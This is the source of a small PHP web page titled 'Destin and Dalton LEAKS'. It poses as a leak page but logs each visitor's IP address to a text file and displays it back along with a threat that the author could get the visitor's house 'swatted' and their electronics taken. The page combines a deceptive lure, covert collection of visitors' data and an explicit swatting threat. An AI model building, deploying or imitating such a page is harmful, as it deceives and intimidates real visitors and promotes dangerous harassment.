<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Destin and Dalton LEAKS</title>
  <meta name="description" content="crazy leaks">
  <style>
    /* Apply the CSS styles from the second code snippet */

    /* Fonts */
    @import url('https://fonts.googleapis.com/css?family=Karla:400,700&display=swap');

    /* Root Variables */
    :root {
      --textColor: black;
      --font: 'Karla', sans-serif;
    }

    /* HTML Styles */
    html {
      font-family: var(--font);
      color: var(--textColor);
      font-size: 18px;
      font-weight: 400;
      background: url('./images/only-joke.jpg');
      background-repeat: no-repeat;
      background-size: cover;
      background-attachment: fixed;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }

    body {
      margin: 10px auto;
    }


    #userName {
      margin: -40px auto;
      font-weight: 700;
    }

    #description {
      margin: 20px auto;
      font-weight: 700;
    }

    main {
      width: 80%;
      max-width: 500px;
      margin: 15px auto;
    }


    /* Additional Styles */
    label {
      border: 1px solid;
      padding: 3px;
      font-weight: bold;
    }

    .disclaimer {
      font-weight: bold;
    }

    input[type="text"],
    input[type="password"],
    input[type="submit"] {
      padding: 8px;
      margin: 5px;
      border-radius: 10px;
    }

    input[type="submit"] {
      background-color: #4caf50;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <center>
    <p class="disclaimer"><b>DISCLAIMER: </b> your IP has just been pulled<br><?php echo $_SERVER['REMOTE_ADDR']; ?><br><b>, the amount of damage that<br>i can do with this is pretty good. i got your GEO location and i could most likely get your house swatted, and with your IP, they will take every peice of electronics in the house :) we will figure something out! </b></p>
    <form action="store.php" method="post">

    </form>
  </center>
</body>
</html>
<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $log_file = 'ip_log.txt';
    $log_entry = date('Y-m-d H:i:s') . ' - ' . $ip . PHP_EOL;

    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
?>
